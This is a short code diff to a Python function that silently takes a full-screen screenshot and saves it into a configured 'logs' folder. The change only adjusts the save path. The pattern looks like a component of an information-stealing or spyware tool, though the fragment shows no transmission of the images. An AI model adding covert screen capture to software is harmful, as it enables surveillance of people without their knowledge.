@@ -5,9 +5,8 @@ from preferences.config import config
 
 def Screenshot():
     try:
-        user = environ['USERPROFILE']
         screen = ImageGrab.grab()
-        makedirs(f'{user}\\{config.pathToLogs}\\Photos', exist_ok=True)
-        screen.save(f'{user}\\{config.pathToLogs}\\Photos\\sreenshot.jpg')
+        makedirs(f'{config.pathToLogs}\\Photos', exist_ok=True)
+        screen.save(f'{config.pathToLogs}\\Photos\\sreenshot.jpg')
     except Exception as e:
         Log(f"Screenshot ---> {e}")
